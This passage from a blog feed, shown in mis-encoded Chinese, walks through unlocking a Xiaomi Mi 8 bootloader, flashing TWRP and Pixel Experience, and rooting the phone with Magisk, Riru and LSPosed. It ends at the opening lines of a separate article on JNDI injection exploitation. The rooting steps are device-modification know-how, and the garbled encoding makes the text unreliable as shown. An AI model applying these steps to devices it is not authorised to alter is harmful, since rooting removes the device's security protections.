id="å°ç±³8-è§£é”-BL"><a href="#å°ç±³8-è§£é”-BL" class="headerlink" title="å°ç±³8 è§£é” BL"></a>å°ç±³8 è§£é” BL</h3><p>BLï¼ˆBootloaderï¼‰ å¯åŠ¨åŠ è½½ç¨‹åºã€‚<strong>BLé”</strong> æ˜¯ç”±æ‰‹æœºå‚å•†åœ¨æ‰‹æœºå‡ºå‚çš„æ—¶å€™å°±è®¾ç½®å¥½çš„ï¼Œé˜²æ­¢ç”¨æˆ·å¯¹æ‰‹æœºç³»ç»Ÿè¿›è¡Œæ›´æ”¹ã€‚</p><p>é¦–å…ˆéœ€è¦åœ¨æ‰‹æœºä¸Šç»‘å®šå°ç±³è´¦å·ï¼Œç³»ç»Ÿè®¾ç½®ä¸­æ‰¾åˆ° <strong>MIUIç‰ˆæœ¬</strong> å¤šæ¬¡ç‚¹å‡»è¿›å…¥å¼€å‘è€…æ¨¡å¼ï¼ŒæŸ¥çœ‹è®¾å¤‡è§£é”çŠ¶æ€ <code>è®¾ç½®-ã€‹æ›´å¤šè®¾ç½®-ã€‹å¼€å‘è€…æ¨¡å¼-ã€‹è®¾å¤‡è§£é”çŠ¶æ€</code></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319182507946.png" data-caption="image-20230319182507946"><img src="/../images/Pixel/image-20230319182507946.png" alt="image-20230319182507946"></a></p><p>ç‚¹å‡»ç»‘å®šè´¦æˆ·å’Œè®¾å¤‡</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318124214979.png" data-caption="image-20230318124214979"><img src="/../images/Pixel/image-20230318124214979.png" alt="image-20230318124214979"></a></p><p>å°ç±³å®˜æ–¹æä¾› BL è§£é” <a href="http://www.miui.com/unlock/index.html">http://www.miui.com/unlock/index.html</a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318122930624.png" data-caption="image-20230318122930624"><img src="/../images/Pixel/image-20230318122930624.png" alt="image-20230318122930624"></a></p><p>ä¸‹è½½è§£é”å·¥å…·</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318123032825.png" data-caption="image-20230318123032825"><img src="/../images/Pixel/image-20230318123032825.png" alt="image-20230318123032825"></a></p><p>åŒå‡»æ‰“å¼€ miflash_unlock.exe è½¯ä»¶</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318130008889.png" data-caption="image-20230318130008889"><img src="/../images/Pixel/image-20230318130008889.png" alt="image-20230318130008889"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318130023826.png" data-caption="image-20230318130023826"><img src="/../images/Pixel/image-20230318130023826.png" alt="image-20230318130023826"></a></p><p>ç™»å½•åˆšæ‰ç™»å½•æ‰‹æœºçš„å°ç±³è´¦å·</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318130037610.png" data-caption="image-20230318130037610"><img src="/../images/Pixel/image-20230318130037610.png" alt="image-20230318130037610"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230404213706121.png" data-caption="image-20230404213706121"><img src="/../images/Pixel/image-20230404213706121.png" alt="image-20230404213706121"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230404213754974.png" data-caption="image-20230404213754974"><img src="/../images/Pixel/image-20230404213754974.png" alt="image-20230404213754974"></a></p><p>åœ¨è¿›å…¥ BL è§£é”å‰ï¼Œéœ€åœ¨å¼€å‘è€…æ¨¡å¼ä¸­å°† USB è°ƒè¯•å¼€å¯</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318130742747.png" data-caption="image-20230318130742747"><img src="/../images/Pixel/image-20230318130742747.png" alt="image-20230318130742747"></a></p><p>æ¥ä¸‹æ¥å°†æ‰‹æœºå…³æœº <code>é•¿æŒ‰ç”µæºé”®+éŸ³é‡å‡</code> è¿›å…¥ <code>fastboot</code>  æ¨¡å¼,ç„¶åä½¿ç”¨å…·å¤‡æ•°æ®ä¼ è¾“çš„æ•°æ®çº¿è¿æ¥æ‰‹æœº</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319182703137.png" data-caption="image-20230319182703137"><img src="/../images/Pixel/image-20230319182703137.png" alt="image-20230319182703137"></a></p><p>æ’å…¥æ‰‹æœºåï¼Œè§£é”åŠŸèƒ½è¿˜æ˜¯æ— æ³•ç‚¹å‡»ï¼Œæ£€æµ‹é©±åŠ¨æ˜¯å¦æ­£ç¡®å®‰è£…</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230404213840722.png" data-caption="image-20230404213840722"><img src="/../images/Pixel/image-20230404213840722.png" alt="image-20230404213840722"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230404214041979.png" data-caption="image-20230404214041979"><img src="/../images/Pixel/image-20230404214041979.png" alt="image-20230404214041979"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230404214105264.png" data-caption="image-20230404214105264"><img src="/../images/Pixel/image-20230404214105264.png" alt="image-20230404214105264"></a></p><p>ç‚¹å‡»ç¡®è®¤è§£é”ï¼Œæ³¨æ„è§£é”åç›¸å½“äºé‡è£…ç³»ç»Ÿäº†ï¼Œèµ„æ–™éœ€æå‰å¤‡ä»½</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230404214126997.png" data-caption="image-20230404214126997"><img src="/../images/Pixel/image-20230404214126997.png" alt="image-20230404214126997"></a></p><p>BL è§£é”éƒ¨åˆ†å°±å·²ç»å®Œæˆäº†</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230404214146559.png" data-caption="image-20230404214146559"><img src="/../images/Pixel/image-20230404214146559.png" alt="image-20230404214146559"></a></p><p>é‡å¯æ‰‹æœºåï¼Œå¼€å‘è€…æ¨¡å¼å¯æŸ¥çœ‹è®¾å¤‡è§£é”çŠ¶æ€</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318132210299.png" data-caption="image-20230318132210299"><img src="/../images/Pixel/image-20230318132210299.png" alt="image-20230318132210299"></a></p><h3 id="åˆ·å…¥åº•åŒ…"><a href="#åˆ·å…¥åº•åŒ…" class="headerlink" title="åˆ·å…¥åº•åŒ…"></a>åˆ·å…¥åº•åŒ…</h3><p>è¿™ä¸€éƒ¨åˆ†éœ€è¦åˆ°å®˜æ–¹ä¸‹è½½ä¸€ä¸ªåº•åŒ…ï¼Œä¹Ÿå°±æ˜¯å¯¹åº”è‡ªèº«æ‰‹æœº Miui ç‰ˆæœ¬çš„<a href="https://web.vip.miui.com/page/info/mio/mio/detail?postId=5817588&fromPathname=mioSingleBoard&app_version=dev.35000">çº¿åˆ·åŒ…</a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319165801972.png" data-caption="image-20230319165801972"><img src="/../images/Pixel/image-20230319165801972.png" alt="image-20230319165801972"></a></p><p>æˆ‘çš„æ˜¯ MIUI ç‰ˆæœ¬æ˜¯ 12.0.3.0ï¼Œç‚¹å‡»ä¸‹è½½çº¿åˆ·åŒ…</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319170319361.png" data-caption="image-20230319170319361"><img src="/../images/Pixel/image-20230319170319361.png" alt="image-20230319170319361"></a></p><p>1ã€æ‰‹æœºå…³æœºè¿›å…¥ <code>FASTBOOT</code> æ¨¡å¼ <code>å…³æœºé”®+éŸ³é‡å‡é”®</code>ï¼Œä½¿ç”¨å…·å¤‡ä¼ è¾“æ•°æ®çš„ USB çº¿è¿æ¥æ‰‹æœº</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318125409183.png" data-caption="image-20230318125409183"><img src="/../images/Pixel/image-20230318125409183.png" alt="image-20230318125409183"></a></p><p>2ã€ä½¿ç”¨å®˜æ–¹çš„ MiFlash å·¥å…·åˆ·å…¥åº•åŒ…,åŒå‡» XiaoMiFlash.exeï¼Œè½¯ä»¶ä¸‹è½½åœ°å€ <a href="https://miuiver.com/miflash/">https://miuiver.com/miflash/</a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318205740379.png" data-caption="image-20230318205740379"><img src="/../images/Pixel/image-20230318205740379.png" alt="image-20230318205740379"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318212413538.png" data-caption="image-20230318212413538"><img src="/../images/Pixel/image-20230318212413538.png" alt="image-20230318212413538"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318210409029.png" data-caption="image-20230318210409029"><img src="/../images/Pixel/image-20230318210409029.png" alt="image-20230318210409029"></a></p><p>åˆ·å…¥åº•åŒ…å®Œæ¯•åå‡ºç°æŠ¥é”™ <strong>Not catch checkpoint</strong> ,æ–°ç‰ˆ MiFlash åœ¨åˆ·æœºå®Œæˆåä¼šæ£€æµ‹æ‰‹æœºæ˜¯å¦å·²ä¸Š BL é”ï¼Œå¦‚æœé€‰æ‹©â€œå…¨éƒ¨åˆ é™¤â€æˆ–â€œä¿ç•™ç”¨æˆ·æ•°æ®â€è¿™ä¸¤ç§åˆ·æœºæ¨¡å¼ï¼Œå› ä¸ºæ²¡æœ‰é”å®š BL é”ï¼Œå°±ä¼šè§¦å‘è¿™ä¸ªé”™è¯¯æ˜¾ç¤ºï¼Œæ‰€ä»¥è¿™ä¸ªæŠ¥é”™é—®é¢˜ä¸å¤§ã€‚ç»§ç»­ä¸‹ä¸€æ­¥å³å¯</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318214541936.png" data-caption="image-20230318214541936"><img src="/../images/Pixel/image-20230318214541936.png" alt="image-20230318214541936"></a></p><p>æ‰‹æœºå·²åˆ·å…¥åº•åŒ…ï¼Œè‡ªåŠ¨é‡å¯ï¼Œæ•°æ®å·²æ¸…é™¤</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319182815459.png" data-caption="image-20230319182815459"><img src="/../images/Pixel/image-20230319182815459.png" alt="image-20230319182815459"></a></p><h3 id="åˆ·å…¥TWRP-Recovery"><a href="#åˆ·å…¥TWRP-Recovery" class="headerlink" title="åˆ·å…¥TWRP Recovery"></a>åˆ·å…¥TWRP Recovery</h3><p>è¿™ä¸€éƒ¨åˆ†ç½‘ä¸Šå¤§å¤šä½¿ç”¨ä¸€é”®åˆ·å…¥è„šæœ¬ï¼Œæœ¬äººå°±åœ¨è¿™ä¸€æ­¥èººå‘ï¼Œå› ä¸ºç‰ˆæœ¬çš„é—®é¢˜å¯¼è‡´ä¸€ç›´æ— æ³•æˆåŠŸåˆ·å…¥ <code>Pixel Experience</code> æ‰€ä»¥è¿™ä¸€æ­¥è¿˜æ˜¯å»ºè®®è‡ªå·±æ‰‹åŠ¨åˆ·ä¸€ä¸‹ï¼Œæ­¥éª¤ä¹Ÿæ˜¯éå¸¸ç®€å•çš„ã€‚</p><p>1ã€ä¸‹è½½ <code>fastboot.exe</code> å·¥å…·ï¼Œä¸‹è½½è¿æ¥å¦‚ä¸‹ï¼š<br><a href="https://developer.android.google.cn/studio/releases/platform-tools?hl=zh-cn">https://developer.android.google.cn/studio/releases/platform-tools?hl=zh-cn</a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319171214916.png" data-caption="image-20230319171214916"><img src="/../images/Pixel/image-20230319171214916.png" alt="image-20230319171214916"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319171228496.png" data-caption="image-20230319171228496"><img src="/../images/Pixel/image-20230319171228496.png" alt="image-20230319171228496"></a></p><p>2ã€ä¸‹è½½  TWRPï¼Œä¸‹è½½åœ°å€ <a href="https://dl.twrp.me/dipper/">https://dl.twrp.me/dipper/</a> æˆ‘è¿™è¾¹ä¸‹è½½äº†æœ€æ–°çš„ç‰ˆæœ¬</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319171338443.png" data-caption="image-20230319171338443"><img src="/../images/Pixel/image-20230319171338443.png" alt="image-20230319171338443"></a></p><p>3ã€åˆ©ç”¨  <code>fastboot.exe</code> å·¥å…·åˆ·å…¥<code> TWRP Recovery</code>ï¼Œé¦–å…ˆå†æ¬¡å…³æœºè¿›å…¥ <code>fastboot</code> æ¨¡å¼ï¼Œè¿æ¥æ•°æ®çº¿</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318125409183.png" data-caption="image-20230318125409183"><img src="/../images/Pixel/image-20230318125409183.png" alt="image-20230318125409183"></a></p><p>å†æ‰§è¡Œå‘½ä»¤</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æ³¨æ„è¯¥å‘½ä»¤ä¸º fastboot.exe ä¸ twrp-3.7.0_9-0-dipper.img åŒç›®å½•ä¸‹ç”Ÿæ•ˆï¼Œè‹¥ä¸åŒè·¯å¾„è¯·è‡ªè¡Œä¿®æ”¹</span><br><span class="line">fastboot.exe flash recovery twrp-3.7.0_9-0-dipper.img</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319171826726.png" data-caption="image-20230319171826726"><img src="/../images/Pixel/image-20230319171826726.png" alt="image-20230319171826726"></a></p><p>æˆåŠŸåˆ·å…¥åï¼Œæ‰‹æœºä¼šè‡ªåŠ¨è¿›å…¥ <code>Recovery</code> åˆå§‹åŒ–ï¼Œè®¾ç½®ä¸€ä¸ªè¿›å…¥ <code>Recovery</code> çš„å¯†ç ,æ³¨æ„è¿™ä¸ªå¯†ç æ˜¯ä½ çš„å¼€æœºå¯†ç ï¼Œè‹¥ä½ å¼€æœºå¯†ç æ”¹å˜äº†ï¼Œä¸‹æ¬¡è¿›å…¥ <code>Recovery</code> çš„å¯†ç ä¹Ÿè¦æ”¹ä¸ºä½ å¼€æœºå¯†ç æ‰èƒ½è¿›å…¥</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319182902803.png" data-caption="image-20230319182902803"><img src="/../images/Pixel/image-20230319182902803.png" alt="image-20230319182902803"></a></p><p>è®¾ç½®å¯†ç åå‡ºç°ä»¥ä¸‹ç•Œé¢ï¼Œç›´æ¥æ»‘åŠ¨å³å¯ï¼ˆå³ä¸‹è§’ Select language å¯é€‰æ‹©ä¸­æ–‡ï¼‰</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319182957100.png" data-caption="image-20230319182957100"><img src="/../images/Pixel/image-20230319182957100.png" alt="image-20230319182957100"></a></p><p>ç°åœ¨å·²ç»æˆåŠŸåˆ·å…¥ç¬¬ä¸‰æ–¹çš„ <code>Recovery</code> äº†</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318220949643.png" data-caption="image-20230318220949643"><img src="/../images/Pixel/image-20230318220949643.png" alt="image-20230318220949643"></a></p><h3 id="åˆ·å…¥-Pixel-Experience"><a href="#åˆ·å…¥-Pixel-Experience" class="headerlink" title="åˆ·å…¥ Pixel_Experience"></a>åˆ·å…¥ Pixel_Experience</h3><p>Pixel_Experience åˆ·æœºåŒ…å®˜æ–¹ä¸‹è½½åœ°å€ <a href="https://get.pixelexperience.org/dipper">https://get.pixelexperience.org/dipper</a> ç”±äºæˆ‘çš„ç‰ˆæœ¬ä¸æ˜¯æœ€æ–°çš„ï¼Œæœ¬äººç‰ˆæœ¬ PixelExperience_dipper-11.0-20211013-1655-OFFICIALï¼Œä¸‹è½½åœ°å€ <a href="https://pan.baidu.com/s/1iVNriq07_2Flqi1Zs6Jw3g">https://pan.baidu.com/s/1iVNriq07_2Flqi1Zs6Jw3g</a> æå–ç  emvv</p><p>1ã€æ‰‹æœºè¿›å…¥ <code>Recovery </code>æ¨¡å¼ä¸‹ï¼Œç‚¹å‡»æ¸…é™¤</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319173327421.png" data-caption="image-20230319173327421"><img src="/../images/Pixel/image-20230319173327421.png" alt="image-20230319173327421"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319173358908.png" data-caption="image-20230319173358908"><img src="/../images/Pixel/image-20230319173358908.png" alt="image-20230319173358908"></a></p><p>é€‰æ‹©è¿™å››é¡¹è¿›è¡Œæ¸…é™¤</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319173443733.png" data-caption="image-20230319173443733"><img src="/../images/Pixel/image-20230319173443733.png" alt="image-20230319173443733"></a></p><p>æ¸…é™¤å®Œæˆäº†ç‚¹å‡»è¿”å›ï¼Œç»§ç»­æ¸…é™¤ data</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319173517976.png" data-caption="image-20230319173517976"><img src="/../images/Pixel/image-20230319173517976.png" alt="image-20230319173517976"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319173534934.png" data-caption="image-20230319173534934"><img src="/../images/Pixel/image-20230319173534934.png" alt="image-20230319173534934"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319173551822.png" data-caption="image-20230319173551822"><img src="/../images/Pixel/image-20230319173551822.png" alt="image-20230319173551822"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319173644133.png" data-caption="image-20230319173644133"><img src="/../images/Pixel/image-20230319173644133.png" alt="image-20230319173644133"></a></p><p>é‡æ–°å¯åŠ¨ <code>Recovery</code> åˆ©ç”¨æ•°æ®çº¿è¿æ¥ç”µè„‘åå°† <code>Pixel_Experience</code> åˆ·æœºåŒ…å¤åˆ¶åˆ°æ‰‹æœºå†…å­˜ä¸Š</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318221129791.png" data-caption="image-20230318221129791"><img src="/../images/Pixel/image-20230318221129791.png" alt="image-20230318221129791"></a></p><p>åœ¨ <code>Recovery</code> å¤„æ‰¾åˆ° <code>Pixel_Experience</code> åˆ·æœºåŒ…åç›´æ¥ç‚¹å‡»å¼€å§‹åˆ·æœº</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319173748614.png" data-caption="image-20230319173748614"><img src="/../images/Pixel/image-20230319173748614.png" alt="image-20230319173748614"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319174211074.png" data-caption="image-20230319174211074"><img src="/../images/Pixel/image-20230319174211074.png" alt="image-20230319174211074"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319174232708.png" data-caption="image-20230319174232708"><img src="/../images/Pixel/image-20230319174232708.png" alt="image-20230319174232708"></a></p><p>å®Œæˆåå…ˆç‚¹å‡»æ¸…é™¤ï¼Œå†é‡å¯æ‰‹æœºè¿›å…¥ç³»ç»Ÿ</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319174303819.png" data-caption="image-20230319174303819"><img src="/../images/Pixel/image-20230319174303819.png" alt="image-20230319174303819"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319174354316.png" data-caption="image-20230319174354316"><img src="/../images/Pixel/image-20230319174354316.png" alt="image-20230319174354316"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319174631189.png" data-caption="image-20230319174631189"><img src="/../images/Pixel/image-20230319174631189.png" alt="image-20230319174631189"></a></p><h3 id="åˆ·å…¥-Magisk-å®ç°-Root"><a href="#åˆ·å…¥-Magisk-å®ç°-Root" class="headerlink" title="åˆ·å…¥ Magisk å®ç° Root"></a>åˆ·å…¥ Magisk å®ç° Root</h3><p>1ã€ä¸‹è½½ Magisk.apk <a href="https://github.com/topjohnwu/Magisk/releases">https://github.com/topjohnwu/Magisk/releases</a> å°†å…¶åç¼€åæ”¹ä¸º.zip,ä½¿ç”¨ <code>Recovery</code> åˆ·å…¥ï¼Œåˆ·å…¥åé‡å¯æ‰‹æœºå®‰è£…æ­£å¸¸çš„ <code>magisk.apk</code> å³å¯æ­£å¸¸æ¢å¤ <code>root</code></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319180829569.png" data-caption="image-20230319180829569"><img src="/../images/Pixel/image-20230319180829569.png" alt="image-20230319180829569"></a></p><p>2ã€è¿›å…¥ <code>Recovery</code> å°† <code>Magisk-v25.2.zip</code> åˆ·å…¥åˆ°æ‰‹æœº</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319181732161.png" data-caption="image-20230319181732161"><img src="/../images/Pixel/image-20230319181732161.png" alt="image-20230319181732161"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319181807960.png" data-caption="image-20230319181807960"><img src="/../images/Pixel/image-20230319181807960.png" alt="image-20230319181807960"></a></p><p>åˆ·å®Œåç‚¹å‡»æ¸…é™¤ ï¼Œå†é‡å¯å³å¯</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319181848655.png" data-caption="image-20230319181848655"><img src="/../images/Pixel/image-20230319181848655.png" alt="image-20230319181848655"></a></p><p>å› ä¸ºæˆ‘ä»¬åˆ·å…¥çš„æ˜¯ .zip åŒ…ï¼Œæ‰€ä»¥ Magisk æ˜¯æ— æ³•æ­£å¸¸ä½¿ç”¨çš„</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319181941395.png" data-caption="image-20230319181941395"><img src="/../images/Pixel/image-20230319181941395.png" alt="image-20230319181941395"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319182044661.png" data-caption="image-20230319182044661"><img src="/../images/Pixel/image-20230319182044661.png" alt="image-20230319182044661"></a></p><p>æˆ‘ä»¬æ‰¾åˆ°åˆšæ‰æˆ‘ä»¬ä¸Šä¼ çš„ <code>Magisk.apk</code> è¿›è¡Œå®‰è£…å³å¯å®Œæˆ <code>ROOT</code></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319182159561.png" data-caption="image-20230319182159561"><img src="/../images/Pixel/image-20230319182159561.png" alt="image-20230319182159561"></a></p><p>å‡ºç°ç‰ˆæœ¬å·è¯æ˜æˆåŠŸ <code>ROOT</code></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319182229824.png" data-caption="image-20230319182229824"><img src="/../images/Pixel/image-20230319182229824.png" alt="image-20230319182229824"></a></p><p>æˆ‘ä»¬å†ä¸Šä¼ ä¸¤ä¸ªæ¨¡å—ï¼Œä¾¿äº <code>ROOT</code> æƒé™æ›´å¥½çš„ä½¿ç”¨ï¼Œä¸‹è½½åœ°å€ <a href="https://github.com/RikkaApps/Riru">https://github.com/RikkaApps/Riru</a> ã€<a href="https://github.com/LSPosed/LSPosed">https://github.com/LSPosed/LSPosed</a> ç›´æ¥ä¸‹è½½åˆ©ç”¨æ•°æ®çº¿æ‹‰åˆ°æ‰‹æœºå†…å­˜ä¸Š</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319183957793.png" data-caption="image-20230319183957793"><img src="/../images/Pixel/image-20230319183957793.png" alt="image-20230319183957793"></a></p><p>æ‰‹æœº Magisk App ä¸Šè¿›è¡Œæœ¬åœ°å®‰è£…å³å¯ï¼Œæ³¨æ„æ˜¯å…ˆå®‰è£… Riru å†å®‰è£… LSPosed</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319185019989.png" data-caption="image-20230319185019989"><img src="/../images/Pixel/image-20230319185019989.png" alt="image-20230319185019989"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319185038023.png" data-caption="image-20230319185038023"><img src="/../images/Pixel/image-20230319185038023.png" alt="image-20230319185038023"></a></p><p>è£…å®Œé‡å¯å³å¯</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319185115904.png" data-caption="image-20230319185115904"><img src="/../images/Pixel/image-20230319185115904.png" alt="image-20230319185115904"></a></p><h2 id="å››ã€æ³¨æ„äº‹é¡¹"><a href="#å››ã€æ³¨æ„äº‹é¡¹" class="headerlink" title="å››ã€æ³¨æ„äº‹é¡¹"></a>å››ã€æ³¨æ„äº‹é¡¹</h2><h3 id="TWRP-Recovery"><a href="#TWRP-Recovery" class="headerlink" title="TWRP Recovery"></a>TWRP Recovery</h3><p>æœ¬æ¬¡åˆ·æœºè¿‡ç¨‹ä¸­ï¼Œç”±äº Recovery åˆ·å…¥æœ‰é—®é¢˜ï¼Œå¯¼è‡´ä¸æ–­é‡è¯•å®‰è£…äº†å¤šæ¬¡ï¼Œæ‰€ä»¥åœ¨åˆ·å…¥ç¬¬ä¸‰æ–¹ Recovery è¿˜æ˜¯é€‰æ‹©æ‰‹åŠ¨è¾ƒä¸ºç¨³å¦¥ã€‚é”™è¯¯çš„æ ‡å¿—ï¼Œä¸‹å›¾ä¸€ä¸ºé”™è¯¯çš„åˆ·å…¥ Recovery å¯¼è‡´æ— æ³•åˆ·å…¥Pixel Experienceï¼Œå›¾äºŒä¸ºæˆåŠŸåˆ·å…¥ Pixel Experienceã€‚</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319175143604.png" data-caption="image-20230319175143604"><img src="/../images/Pixel/image-20230319175143604.png" alt="image-20230319175143604"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319175243609.png" data-caption="image-20230319175243609"><img src="/../images/Pixel/image-20230319175243609.png" alt="image-20230319175243609"></a></p><h3 id="æ— æ³•è¿›å…¥ç³»ç»Ÿï¼Œå¡åœ¨å¼€æœº"><a href="#æ— æ³•è¿›å…¥ç³»ç»Ÿï¼Œå¡åœ¨å¼€æœº" class="headerlink" title="æ— æ³•è¿›å…¥ç³»ç»Ÿï¼Œå¡åœ¨å¼€æœº"></a>æ— æ³•è¿›å…¥ç³»ç»Ÿï¼Œå¡åœ¨å¼€æœº</h3><p>åœ¨ä½¿ç”¨ä½ç‰ˆæœ¬çš„ <code>Recovery</code> å¯¼è‡´åˆ·å…¥ <code>Pixel Experience</code> åœç•™åœ¨å¼€æœºå¤„ï¼Œæ— æ³•è¿›è¡Œæ­£å¸¸çš„ç³»ç»Ÿ</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319175529067.png" data-caption="image-20230319175529067"><img src="/../images/Pixel/image-20230319175529067.png" alt="image-20230319175529067"></a></p><p>è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å°ç±³çš„å·¥å…·è¿›è¡Œçº¿åˆ·é‡æ–°åˆ·å› MIUI ï¼Œæ­¥éª¤ä¸è¾“å…¥åº•åŒ…æ–¹æ³•ä¸€è‡´ï¼ŒæˆåŠŸåä¼šè‡ªåŠ¨è¿›è¡Œ MIUI ç³»ç»Ÿ</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318212413538.png" data-caption="image-20230318212413538"><img src="/../images/Pixel/image-20230318212413538.png" alt="image-20230318212413538"></a></p><h2 id="äº”ã€å‚è€ƒ"><a href="#äº”ã€å‚è€ƒ" class="headerlink" title="äº”ã€å‚è€ƒ"></a>äº”ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https://www.xianshuabao.com/faq/xianshuawenti/98.html</span><br><span class="line">https://www.devgox.com/archives/1034.html</span><br><span class="line">https://zhuanlan.zhihu.com/p/311264528</span><br><span class="line">https://blog.csdn.net/jingxuan2583/article/details/106847033</span><br><span class="line">https://www.bilibili.com/video/BV1PJ411d7yi/?spm_id_from=333.788.videocard.9</span><br><span class="line">https://www.youtube.com/watch?v=ZCIQloQCwOk</span><br><span class="line">https://magiskcn.com/</span><br><span class="line">https://zhuanlan.zhihu.com/p/380610364</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APPæµ‹è¯•ç³»åˆ— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åˆ·æœº </tag>
            
            <tag> Pixel Experience </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaä»£ç å®¡è®¡(ä¸ƒ)-JNDIæ³¨å…¥åŸç†åŠåˆ©ç”¨è€ƒç©¶</title>
      <link href="/2023/03/07/Java%E4%BB%A3%E7%A0%81%E5%AE%A1(%E4%B8%83)-JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E8%80%83%E7%A9%B6/"/>
      <url>/2023/03/07/Java%E4%BB%A3%E7%A0%81%E5%AE%A1(%E4%B8%83)-JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E8%80%83%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>æœ¬ç¯‡æ–‡ç« ä½œä¸º  JNDI  æ³¨å…¥å­¦ä¹ çš„ç¬¬ä¸€ç¯‡ï¼Œä¸»è¦äº†è§£å…¶åŸºæœ¬çš„åŸç†åŠå…¶åˆ©ç”¨ï¼Œæ–¹ä¾¿åç»­é’ˆå¯¹ JNDI æ³¨å…¥çš„å­¦ä¹ ï¼Œç¯‡å¹…ä¸é•¿ã€‚</p><h2 id="äºŒã€JNDI-ç®€ä»‹"><a href="#äºŒã€JNDI-ç®€ä»‹" class="headerlink" title="äºŒã€JNDI ç®€ä»‹"></a>äºŒã€JNDI ç®€ä»‹</h2><p>JNDI(Java Naming and Directory 